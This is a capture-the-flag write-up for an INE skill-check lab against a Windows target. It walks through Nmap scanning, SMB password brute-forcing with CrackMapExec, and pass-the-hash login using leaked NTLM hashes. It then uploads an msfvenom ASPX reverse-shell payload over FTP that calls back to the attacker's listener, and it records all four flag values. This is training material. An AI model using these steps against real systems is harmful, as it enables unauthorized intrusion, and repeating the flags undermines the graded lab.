### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

A target machine is accessible at **target.ine.local**. Identify the services and capture the flags.

- **Flag 1: Looks like smb user tom has not changed his password from a very long time.**
- **Flag 2: Using the NTLM hash list discovered in the previous challenge, can you compromise the smb user nancy?**
- **Flag 3: I wonder what the hint found in the previous challenge be useful for!**
- **Flag 4: Can you compromise the target machine and retrieve the C://flag4.txt file?**

The following wordlist will be useful:

- /usr/share/wordlists/metasploit/unix_passwords.txt

# Tools

- Metasploit
- Nmap
- smbmap
- Firefox

Let’s get started!

**Flag 1: Looks like smb user tom has not changed his password from a very long time.**

![8e7d8f1d1e6d05bc00ac463a18fd6ffe.png](resources/8e7d8f1d1e6d05bc00ac463a18fd6ffe.png)

As usual, we begin with **Nmap** to scan for open ports and services using the following command

nmap -sC -sV -p- target.ine.local

![94c418158fc59ac2f120c6ce9256283a.png](resources/94c418158fc59ac2f120c6ce9256283a.png)

So, the **SMB service** is running on **port 445**, and as the question suggests, user **Tom** has a weak password. Let’s attempt to brute-force the password using **CrackMapExec**.

We can use tools like **Hydra, CrackMapExec, or a Metasploit module** for brute-forcing, but in this case, we’ll use **CrackMapExec**.

**Command:**

crackmapexec smb target.ine.local -u tom -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

![abd7906b5790e0ccb59736464e0cab5d.png](resources/abd7906b5790e0ccb59736464e0cab5d.png)

![e6d7681ed6bf049f426bea1a2ef94898.png](resources/e6d7681ed6bf049f426bea1a2ef94898.png)

And here we have successfully obtained the password: **felipe**.

Now, we can enumerate the shares accessible to **Tom** and analyze his permissions using **SMBMap**. This will help us understand what operations he can perform on the system.

**Command:**

smbmap -H target.ine.local -u tom -p felipe

![196c6dfc9aecd213fdf67bf51e54ea18.png](resources/196c6dfc9aecd213fdf67bf51e54ea18.png)

Now that we know there are only three shares with **read-only** access, let’s connect to the **HRDocuments** share using the following command:

**Command:**

smbclient [//target.ine.local/HRDocuments](//target.ine.local/HRDocuments) -U tom

![569f0fde20637d11cd75827f1e3efd7a.png](resources/569f0fde20637d11cd75827f1e3efd7a.png)

After connecting to the **HRDocuments** share, type the `ls` command to list the available files. Here, we find **flag1.txt** and **leaked-hashes.txt**.

To download these files, use the `get` command as follows:

![870622d01b9cd57ce375687ce6b33f4c.png](resources/870622d01b9cd57ce375687ce6b33f4c.png)

Now, use the `cat` command to read the contents of **flag1.txt**. Here, we obtain our first flag:

78bdadd71c4d42988dfe0603023e0744

download leaked-hashes.txt file --> get leaked-hashes.txt

![05aa301296e8aa312cee3808fb494813.png](resources/05aa301296e8aa312cee3808fb494813.png)

**Flag 2: Using the NTLM hash list discovered in the previous challenge, can you compromise the smb user nancy?**

In the previous step, we discovered **leaked-hashes.txt**, which contains NTLM hashes. Since the question asks us to compromise the **Nancy** user, we can use the **Metasploit** module `scanner/smb/smb_login` to attempt authentication using the leaked NTLM hash.

First, type `options` to list the required options for the module.

![cce3f0a47c71f9c0cef505ac35a76e09.png](resources/cce3f0a47c71f9c0cef505ac35a76e09.png)

Now, set the following options for the **Metasploit** module `scanner/smb/smb_login`:

**RHOSTS**: Set the target IP address or hostname which is `target.ine.local`  -->

set RHOSTS target.ine.local

**PASS_FILE**: Set the path to the file containing the NTLM hashes which is `lekaded-hashes.txt`. -->

set PASS_FILE leaked-hashes.txt

**SMBUser**: Set the SMB username, which is `nancy`. -->

set SMBuser nancy

![10e8adf39a25eb43614039fc47672ad1.png](resources/10e8adf39a25eb43614039fc47672ad1.png)

To create a session upon successful authentication, we need to set **CreateSession** to **true**. Once this is done, we can run the module to attempt compromising the SMB user **Nancy**.

![6b53f6c7ea948831b46f0ebea81e6aef.png](resources/6b53f6c7ea948831b46f0ebea81e6aef.png)

We have successfully compromised the ‘nancy’ user. To view the active sessions, type the command `sessions`. To interact with the session, use the following command: `sessions 1`.

![3544025feacd47ddc1e4bc8bd2d7b596.png](resources/3544025feacd47ddc1e4bc8bd2d7b596.png)

sessions 1

![db38c5c084ec5db714c1f36fa30a0929.png](resources/db38c5c084ec5db714c1f36fa30a0929.png)

To list the shares available for the ‘nancy’ user, use the command: `shares`.

![b81e93d06b0516cadf3d406510a58462.png](resources/b81e93d06b0516cadf3d406510a58462.png)

We don’t have access to the `HRDocuments` share. Let's connect to the `ITResources` share by using the command

shares -i ITResources

Then, use the `ls` command to list the contents of the directory.

![a5feff57d8404fa7aa0b06f5c6dc600b.png](resources/a5feff57d8404fa7aa0b06f5c6dc600b.png)

To retrieve this flag, use the

download flag2.txt

command. And also download the **hint.txt** file.

![968e7f2ebe31c616fbfb8c41b98674a5.png](resources/968e7f2ebe31c616fbfb8c41b98674a5.png)

Use the `cat` command to read its contents. This is where we find our second flag, which is:

![7bc2fb520e926c0b1b665de5f71e926d.png](resources/7bc2fb520e926c0b1b665de5f71e926d.png)

e4425371607c4bd7b949badf81e883a6

**Flag.3 I wonder what the hint found in the previous challenge will be useful for!**

In the beginning, we enumerated the services running on the domain. Now, let’s try connecting to the FTP service using the credentials found in `hint.txt`. To connect to FTP, type the command: `ftp target.ine.local`, and enter the credentials when prompted.

![ad2fa8ef6ad54f16ba3d7c8491d1fc4d.png](resources/ad2fa8ef6ad54f16ba3d7c8491d1fc4d.png)

![bd2a8077a0b3c718ac84bf846aebcf8c.png](resources/bd2a8077a0b3c718ac84bf846aebcf8c.png)

We have successfully connected to the FTP server. To view the contents, type the `dir` or ls command.

![a2c7b631c58ca9af02987e0b5bd88b67.png](resources/a2c7b631c58ca9af02987e0b5bd88b67.png)

Here, we find our third flag, which is:

![1134281f27c41e62c706855315c8c9b8.png](resources/1134281f27c41e62c706855315c8c9b8.png)

![10238212c36c9ab4987d196797c1434b.png](resources/10238212c36c9ab4987d196797c1434b.png)

7f4d86e443f04d4fabde5caf6d7a3074

**Flag4: Can you compromise the target machine and retrieve the C://flag4.txt file?**

After further analysis, we see that port 80 is open and we have FTP access. Enumeration shows that FTP is linked to this port, meaning any files uploaded will be reflected on the website. Since the server is running IIS, we can upload an ASPX shell.

**Note**: Use your IP address for LHOST.

![05da0cdf8521154cc56d7c1d14151f5b.png](resources/05da0cdf8521154cc56d7c1d14151f5b.png)

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.40.5 LPORT=1234 -f aspx > shell.aspx

![ef0ee8fffde13e5932cad363b1823111.png](resources/ef0ee8fffde13e5932cad363b1823111.png)

Upload the shell to FTP using the `put` command.

![d9b83278d6828505d93d50a38742ff7b.png](resources/d9b83278d6828505d93d50a38742ff7b.png)

Then, use the `msfconsole` module `/multi/handler` to handle the incoming connection.

search multi/handler

![9ef43a933edb8592ef5fabc8016a1f21.png](resources/9ef43a933edb8592ef5fabc8016a1f21.png)

Set these three parameters: `PAYLOAD`, `LHOST`, and `LPORT`, which were configured in the `msfvenom` payload.

set PAYLOAD windows/x64/meterpreter/reverse_tcp  
set LHOST 10.10.40.6  
set LPORT 1234  
run

![5f4044f11d397df13f38277611761987.png](resources/5f4044f11d397df13f38277611761987.png)

Navigate to http://target.ine.local/shell.aspx in the browser. You should observe that we have successfully obtained the shell.

![a1d2e39ca94dec873fde6698cc8fec31.png](resources/a1d2e39ca94dec873fde6698cc8fec31.png)

![a48022169b6a74fdfbbe5fb4cef99afa.png](resources/a48022169b6a74fdfbbe5fb4cef99afa.png)

![e9e5323cdd69702b0ceb618f961255fb.png](resources/e9e5323cdd69702b0ceb618f961255fb.png)

To retrieve the last flag, type

cat C://flag4.txt

![633233dee6ef5c12cba071856baaadbc.png](resources/633233dee6ef5c12cba071856baaadbc.png)

or create a shell and go to C driver type flag4.txt

![5e45f7de0a1a4198cb65030c98e519ef.png](resources/5e45f7de0a1a4198cb65030c98e519ef.png)

779b1c79bec9462a8a830be9cc1a05fa

![1a2d7ec675327df92b293814b380e609.png](resources/1a2d7ec675327df92b293814b380e609.png)
